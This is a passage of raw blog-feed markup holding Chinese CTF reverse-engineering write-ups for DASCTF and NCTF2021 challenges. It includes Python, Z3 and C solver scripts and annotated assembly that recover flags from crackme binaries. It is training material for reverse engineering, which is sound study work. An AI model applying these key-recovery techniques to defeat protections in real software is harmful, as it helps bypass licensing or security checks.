class="number">0b10101100</span>, <span class="number">0b10101010</span>, <span class="number">0b10101110</span>, <span class="number">0b10100101</span>, <span class="number">0b10101101</span>, <span class="number">0b10100101</span>, <span class="number">0b10101010</span>, <span class="number">0b10101110</span>, <span class="number">0b10110001</span>, <span class="number">0b11111101</span>, <span class="number">0b11111110</span>, <span class="number">0b11111101</span>, <span class="number">0b11111000</span>, <span class="number">0b10110001</span>, <span class="number">0b10101000</span>,</span><br><span class="line">       <span class="number">0b10101100</span>, <span class="number">0b11111111</span>, <span class="number">0b10100100</span>, <span class="number">0b10110001</span>, <span class="number">0b10100100</span>, <span class="number">0b10101111</span>, <span class="number">0b10101101</span>, <span class="number">0b10100100</span>, <span class="number">0b10110001</span>, <span class="number">0b11111010</span>, <span class="number">0b10101100</span>, <span class="number">0b11111101</span>, <span class="number">0b10101010</span>, <span class="number">0b11111110</span>, <span class="number">0b10101101</span>, <span class="number">0b10100100</span>, <span class="number">0b10101010</span>, <span class="number">0b10101000</span>, <span class="number">0b10100100</span>, <span class="number">0b10101110</span>, <span class="number">0b11111111</span>, <span class="number">0b11100001</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [<span class="built_in">chr</span>(i ^ <span class="number">0x9c</span>) <span class="keyword">for</span> i <span class="keyword">in</span> enc]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line"><span class="comment"># DASCTF&#123;06291962-abad-40c8-8318-f0a6b186482c&#125;</span></span><br></pre></td></tr></table></figure><p>验证下</p><p><img src="./image-20211202155009690.png" alt="image-20211202155009690"></p><p>flag正确，flag为 <code>DASCTF&#123;06291962-abad-40c8-8318-f0a6b186482c&#125;</code></p><h2 id="ROR"><a href="#ROR" class="headerlink" title="ROR"></a>ROR</h2><p>IDA打开分析</p><p><img src="./image-20211202151823162.png" alt="image-20211202151823162"></p><p>先找出<code>byte_405000</code>的索引，然后Z3解即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ENC_FLAG = [<span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x24</span>, <span class="number">0x36</span>, <span class="number">0x9D</span>, <span class="number">0x71</span>, <span class="number">0xB8</span>, <span class="number">0xC8</span>, <span class="number">0x65</span>, <span class="number">0xFB</span>,</span><br><span class="line">            <span class="number">0x87</span>, <span class="number">0x7F</span>, <span class="number">0x9A</span>, <span class="number">0x9C</span>, <span class="number">0xB1</span>, <span class="number">0xDF</span>, <span class="number">0x65</span>, <span class="number">0x8F</span>, <span class="number">0x9D</span>, <span class="number">0x39</span>,</span><br><span class="line">            <span class="number">0x8F</span>, <span class="number">0x11</span>, <span class="number">0xF6</span>, <span class="number">0x8E</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0xB4</span>, <span class="number">0x8C</span>, <span class="number">0x39</span>,</span><br><span class="line">            <span class="number">0xFB</span>, <span class="number">0x99</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>, <span class="number">0x63</span>, <span class="number">0xE7</span>, <span class="number">0xA4</span>, <span class="number">0x79</span>]</span><br><span class="line"></span><br><span class="line">byte_405000 = [<span class="number">0x65</span>, <span class="number">0x08</span>, <span class="number">0xF7</span>, <span class="number">0x12</span>, <span class="number">0xBC</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0xB8</span>, <span class="number">0x83</span>, <span class="number">0x7B</span>,</span><br><span class="line">               <span class="number">0x02</span>, <span class="number">0xD5</span>, <span class="number">0x34</span>, <span class="number">0xBD</span>, <span class="number">0x9F</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0xD4</span>, <span class="number">0xD7</span>,</span><br><span class="line">               <span class="number">0xEB</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5E</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x7D</span>, <span class="number">0xF4</span>, <span class="number">0x11</span>, <span class="number">0xFF</span>,</span><br><span class="line">               <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xAD</span>, <span class="number">0x57</span>, <span class="number">0x46</span>, <span class="number">0x67</span>, <span class="number">0x2A</span>, <span class="number">0x9D</span>, <span class="number">0x7F</span>, <span class="number">0xD2</span>,</span><br><span class="line">               <span class="number">0xE1</span>, <span class="number">0x21</span>, <span class="number">0x8B</span>, <span class="number">0x1D</span>, <span class="number">0x5A</span>, <span class="number">0x91</span>, <span class="number">0x38</span>, <span class="number">0x94</span>, <span class="number">0xF9</span>, <span class="number">0x0C</span>,</span><br><span class="line">               <span class="number">0x00</span>, <span class="number">0xCA</span>, <span class="number">0xE8</span>, <span class="number">0xCB</span>, <span class="number">0x5F</span>, <span class="number">0x19</span>, <span class="number">0xF6</span>, <span class="number">0xF0</span>, <span class="number">0x3C</span>, <span class="number">0xDE</span>,</span><br><span class="line">               <span class="number">0xDA</span>, <span class="number">0xEA</span>, <span class="number">0x9C</span>, <span class="number">0x14</span>, <span class="number">0x75</span>, <span class="number">0xA4</span>, <span class="number">0x0D</span>, <span class="number">0x25</span>, <span class="number">0x58</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0x44</span>, <span class="number">0x86</span>, <span class="number">0x05</span>, <span class="number">0x6B</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x6D</span>, <span class="number">0xD1</span>, <span class="number">0x63</span>, <span class="number">0x98</span>,</span><br><span class="line">               <span class="number">0x68</span>, <span class="number">0x2D</span>, <span class="number">0x52</span>, <span class="number">0x3D</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0xD6</span>, <span class="number">0xD0</span>, <span class="number">0xA2</span>, <span class="number">0xED</span>,</span><br><span class="line">               <span class="number">0xA5</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x3E</span>, <span class="number">0xF2</span>, <span class="number">0x22</span>, <span class="number">0x06</span>, <span class="number">0xF3</span>, <span class="number">0x1A</span>, <span class="number">0xA8</span>,</span><br><span class="line">               <span class="number">0x09</span>, <span class="number">0xDC</span>, <span class="number">0x7C</span>, <span class="number">0x4B</span>, <span class="number">0x5C</span>, <span class="number">0x1E</span>, <span class="number">0xA1</span>, <span class="number">0xB0</span>, <span class="number">0x71</span>, <span class="number">0x04</span>,</span><br><span class="line">               <span class="number">0xE2</span>, <span class="number">0x9B</span>, <span class="number">0xB7</span>, <span class="number">0x10</span>, <span class="number">0x4E</span>, <span class="number">0x16</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x56</span>, <span class="number">0xD8</span>,</span><br><span class="line">               <span class="number">0x61</span>, <span class="number">0xB4</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x87</span>, <span class="number">0xF8</span>, <span class="number">0x0A</span>, <span class="number">0x13</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>,</span><br><span class="line">               <span class="number">0xE6</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x2C</span>, <span class="number">0xB1</span>, <span class="number">0xEC</span>, <span class="number">0x93</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0xA9</span>,</span><br><span class="line">               <span class="number">0x95</span>, <span class="number">0xBB</span>, <span class="number">0xD3</span>, <span class="number">0x51</span>, <span class="number">0x39</span>, <span class="number">0xE7</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0x29</span>, <span class="number">0x72</span>,</span><br><span class="line">               <span class="number">0x47</span>, <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x15</span>, <span class="number">0xDF</span>, <span class="number">0xD9</span>, <span class="number">0x17</span>, <span class="number">0x74</span>, <span class="number">0x3F</span>, <span class="number">0x62</span>,</span><br><span class="line">               <span class="number">0xCD</span>, <span class="number">0x41</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x53</span>, <span class="number">0x85</span>, <span class="number">0x31</span>, <span class="number">0x8A</span>, <span class="number">0x30</span>, <span class="number">0xAA</span>,</span><br><span class="line">               <span class="number">0xAC</span>, <span class="number">0x2E</span>, <span class="number">0xA3</span>, <span class="number">0x50</span>, <span class="number">0x7A</span>, <span class="number">0xB5</span>, <span class="number">0x8E</span>, <span class="number">0x69</span>, <span class="number">0x1F</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x97</span>, <span class="number">0x55</span>, <span class="number">0x3A</span>, <span class="number">0xB2</span>, <span class="number">0x59</span>, <span class="number">0xAB</span>, <span class="number">0xE0</span>, <span class="number">0x28</span>, <span class="number">0xC0</span>, <span class="number">0xB3</span>,</span><br><span class="line">               <span class="number">0xBE</span>, <span class="number">0xCC</span>, <span class="number">0xC6</span>, <span class="number">0x2B</span>, <span class="number">0x5B</span>, <span class="number">0x92</span>, <span class="number">0xEE</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x84</span>,</span><br><span class="line">               <span class="number">0x4D</span>, <span class="number">0x0F</span>, <span class="number">0x26</span>, <span class="number">0x4A</span>, <span class="number">0x48</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x80</span>, <span class="number">0x5D</span>, <span class="number">0x6F</span>,</span><br><span class="line">               <span class="number">0x4C</span>, <span class="number">0xB9</span>, <span class="number">0x81</span>, <span class="number">0x96</span>, <span class="number">0x32</span>, <span class="number">0xFD</span>, <span class="number">0x40</span>, <span class="number">0x8D</span>, <span class="number">0x27</span>, <span class="number">0xC1</span>,</span><br><span class="line">               <span class="number">0x78</span>, <span class="number">0x4F</span>, <span class="number">0x79</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0x8C</span>, <span class="number">0xE5</span>, <span class="number">0x9E</span>, <span class="number">0xAE</span>, <span class="number">0xBF</span>,</span><br><span class="line">               <span class="number">0xEF</span>, <span class="number">0x42</span>, <span class="number">0xC5</span>, <span class="number">0xAF</span>, <span class="number">0xA0</span>, <span class="number">0xC2</span>, <span class="number">0xFA</span>, <span class="number">0xC7</span>, <span class="number">0xB6</span>, <span class="number">0xDB</span>,</span><br><span class="line">               <span class="number">0x18</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0xFE</span>, <span class="number">0xE9</span>, <span class="number">0xF5</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x2F</span>, <span class="number">0xF1</span>,</span><br><span class="line">               <span class="number">0x1B</span>, <span class="number">0xFB</span>, <span class="number">0xBA</span>, <span class="number">0xA7</span>, <span class="number">0x37</span>, <span class="number">0x8F</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">indexs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ENC_FLAG)):</span><br><span class="line">    indexs.append(byte_405000.index(ENC_FLAG[i]))</span><br><span class="line"></span><br><span class="line">v6 = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">v6[<span class="number">0</span>] = <span class="number">128</span></span><br><span class="line">v6[<span class="number">1</span>] = <span class="number">64</span></span><br><span class="line">v6[<span class="number">2</span>] = <span class="number">32</span></span><br><span class="line">v6[<span class="number">3</span>] = <span class="number">16</span></span><br><span class="line">v6[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">v6[<span class="number">5</span>] = <span class="number">4</span></span><br><span class="line">v6[<span class="number">6</span>] = <span class="number">2</span></span><br><span class="line">v6[<span class="number">7</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">&quot;flag%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        v5 = ((v6[j] &amp; flag[i + <span class="number">3</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">3</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">3</span>]) &gt;&gt; ((<span class="number">3</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">2</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">2</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">2</span>]) &gt;&gt;</span><br><span class="line">                                                                                                                                                       ((<span class="number">2</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">1</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">1</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">1</span>]) &gt;&gt; ((<span class="number">1</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i]) &lt;&lt; (<span class="number">8</span> - -j % <span class="number">8</span>)) | ((v6[j] &amp; flag[i]) &gt;&gt; (-j % <span class="number">8</span>))</span><br><span class="line">        index = ((v6[j] &amp; flag[i + <span class="number">7</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">7</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">7</span>]) &gt;&gt; ((<span class="number">7</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">6</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">6</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">6</span>]) &gt;&gt; ((<span class="number">6</span> - j) % <span class="number">8</span>)</span><br><span class="line">                                                                                                                                                          ) | ((v6[j] &amp; flag[i + <span class="number">5</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">5</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">5</span>]) &gt;&gt; ((<span class="number">5</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">4</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">4</span> - j) % <span class="number">8</span>)) | ((v6[j] &amp; flag[i + <span class="number">4</span>]) &gt;&gt; ((<span class="number">4</span> - j) % <span class="number">8</span>)) | v5</span><br><span class="line">        s.add(index == indexs[i+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line"></span><br><span class="line">m = s.model()</span><br><span class="line">flag = [<span class="built_in">chr</span>(m[i].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DASCTF&#123;&quot;</span> + <span class="string">&quot;&quot;</span>.join(flag) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;Q5la5_3KChtem6_HYHk_NlHhNZz73aCZeK05II96&#125;</span></span><br></pre></td></tr></table></figure><h2 id="虚假的粉丝"><a href="#虚假的粉丝" class="headerlink" title="虚假的粉丝"></a>虚假的粉丝</h2><p>IDA打开程序分析</p><p><img src="./image-20211202150624848.png" alt="image-20211202150624848">\</p><p>输入3个数字</p><ol><li>文件序号</li><li>读取此文件的偏移</li><li>从偏移处读多少个字节</li></ol><p>然后下面判断读取的数据<code>Buffer[0] != &#39;U&#39; || Buffer[39] != &#39;S&#39;</code></p><p>写脚本判断哪个文件含有这2个字母</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5317</span>):</span><br><span class="line">    filename = <span class="string">&quot;f/ASCII-faded &quot;</span> + <span class="built_in">str</span>(i).zfill(<span class="number">4</span>) + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    c = f.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;U&#x27;</span> <span class="keyword">in</span> c <span class="keyword">and</span> <span class="string">&#x27;S&#x27;</span> <span class="keyword">in</span> c:</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="comment">#  f/ASCII-faded 4157.txt</span></span><br></pre></td></tr></table></figure><p>于是打开找到了 <code>UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNS</code> 将其base64解密为<code>S3Cre7_K3y%20%3D%20Al4N_wAlK3R</code></p><p>URL_decode后为 <code>S3Cre7_K3y = Al4N_wAlK3R</code></p><p>偏移是0x45E(1118), 输入的三个数字是4157, 1118, 40，然后输入 <code>Al4N_wAlK3R</code></p><p>最终<code>/f/ASCII-faded 5315.txt</code> 会被解密，打开即可看到flag</p><p><img src="./image-20211202151449039.png" alt="image-20211202151449039"></p><p>flag为 <code>A_TrUe_AW_f4ns</code></p><h1 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h1><p>链接：<a href="https://pan.baidu.com/s/1Manwxlun-0gK4ZdkzBU0Zw">https://pan.baidu.com/s/1Manwxlun-0gK4ZdkzBU0Zw</a><br>提取码：sj8s </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2021_RE_WP</title>
      <link href="/2021/11/29/NCTF2021_RE_WP/"/>
      <url>/2021/11/29/NCTF2021_RE_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2021-RE-WP"><a href="#NCTF2021-RE-WP" class="headerlink" title="NCTF2021_RE_WP"></a>NCTF2021_RE_WP</h1><h2 id="Hello-せかい"><a href="#Hello-せかい" class="headerlink" title="Hello せかい"></a>Hello せかい</h2><p>记事本都能做的题.IDA打开直接看到flag</p><p><img src="./image-20211128220631446.png" alt="image-20211128220631446"></p><p>flag为 <code>NCTF&#123;We1come_2_Reverse_Engineering&#125;</code></p><h2 id="Shadowbringer"><a href="#Shadowbringer" class="headerlink" title="Shadowbringer"></a>Shadowbringer</h2><p>base64换了2次表，调试起来找到表，逆回去即可</p><p><img src="./image-20211128223954505.png" alt="image-20211128223954505"></p><p><img src="./image-20211129131911977.png" alt="image-20211129131911977"></p><p><img src="./image-20211129131918276.png" alt="image-20211129131918276"></p><p>写脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!&quot;</span></span><br><span class="line">std_table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">my_table = <span class="string">&#x27;#$%&amp;\x27()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab&#x27;</span></span><br><span class="line">my_table2 = <span class="string">&#x27;ba`_^]h[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210s.-,+*)(\x27&amp;%$#&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = flag.translate(<span class="built_in">str</span>.maketrans(my_table2, std_table))</span><br><span class="line">flag = flag.replace(<span class="string">&quot;!&quot;</span>, <span class="string">&#x27;=&#x27;</span>).encode() <span class="comment"># &quot;6G074JP+s)WV:Z+T&lt;&amp;(Q18`Ks)WV:Y4hs9[h:YCS?&amp;0`&quot;</span></span><br><span class="line">flag = base64.b64decode(flag).decode()</span><br><span class="line">flag = flag.translate(<span class="built_in">str</span>.maketrans(my_table, std_table))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># NCTF&#123;H0m3_r1d1n9_h0m3_dy1n9_h0p3&#125;</span></span><br></pre></td></tr></table></figure><p>flag 为 <code>NCTF&#123;H0m3_r1d1n9_h0m3_dy1n9_h0p3&#125;</code></p><h2 id="鲨鲨的秘密"><a href="#鲨鲨的秘密" class="headerlink" title="鲨鲨的秘密"></a>鲨鲨的秘密</h2><p>这个题跟西湖论剑那个第一个RE题好像</p><p><img src="./image-20211128221354110.png" alt="image-20211128221354110"></p><p><code>loc_404E3B</code>为执行的指令，因为每次就33条汇编，也不长，直接调试把第一轮所有的汇编拿出来分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mov     ds:dword_404E50, 0FFFFFFFFh# dword_404E50 = -1</span><br><span class="line">mov     ecx, ds:I</span><br><span class="line">mov     dl, [ecx+4049F8h]   # flag[0]</span><br><span class="line">mov     byte ptr ds:dword_404E4C, dl</span><br><span class="line">movzx   eax, byte ptr ds:dword_404E4C</span><br><span class="line">xor     eax, ds:dword_404E50  dword_404E4C = (flag[0] ^ 404E50 ) &amp; 0xFF</span><br><span class="line">mov     byte ptr ds:dword_404E4C, al</span><br><span class="line">movzx   ecx, byte ptr ds:dword_404E4C</span><br><span class="line">and     ecx, 0FFhdword_404E50 &gt;&gt;= 8</span><br><span class="line">mov     byte ptr ds:dword_404E4C, cl</span><br><span class="line">mov     edx, ds:dword_404E50dword_404E50 ^= dword_404A38[dword_404E4C * 4]</span><br><span class="line">shr     edx, 8</span><br><span class="line">mov     ds:dword_404E50, edx</span><br><span class="line">movzx   eax, byte ptr ds:dword_404E4C</span><br><span class="line">mov     ecx, ds:dword_404E50</span><br><span class="line">xor     ecx, ds:dword_404A38[eax*4]</span><br><span class="line">mov     ds:dword_404E50, ecx</span><br><span class="line"></span><br><span class="line">mov     edx, ds:I</span><br><span class="line">mov     al, [edx+4049F9h]# flag[1]</span><br><span class="line">mov     byte ptr ds:dword_404E4C, al</span><br><span class="line">movzx   ecx, byte ptr ds:dword_404E4C</span><br><span class="line">xor     ecx, ds:dword_404E50404E4C = flag[1] ^ 404E50</span><br><span class="line">mov     byte ptr ds:dword_404E4C, cl</span><br><span class="line">mov     edx, ds:dword_404E50</span><br><span class="line">shr     edx, 8dword_404E50 &gt;&gt;= 8</span><br><span class="line">mov     ds:dword_404E50, edx</span><br><span class="line">movzx   eax, byte ptr ds:dword_404E4C</span><br><span class="line">mov     ecx, ds:dword_404E50</span><br><span class="line">xor     ecx, ds:dword_404A38[eax*4]dword_404E50 ^= dword_404A38[dword_404E4C * 4]</span><br><span class="line">mov     ds:dword_404E50, ecx</span><br><span class="line">mov     edx, ds:dword_404E50</span><br><span class="line">xor     edx, 0FFFFFFFFh</span><br><span class="line">mov     ds:dword_404E50, edx</span><br></pre></td></tr></table></figure><p>分析完毕，把程序中加密后的flag提取出来直接爆破</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> 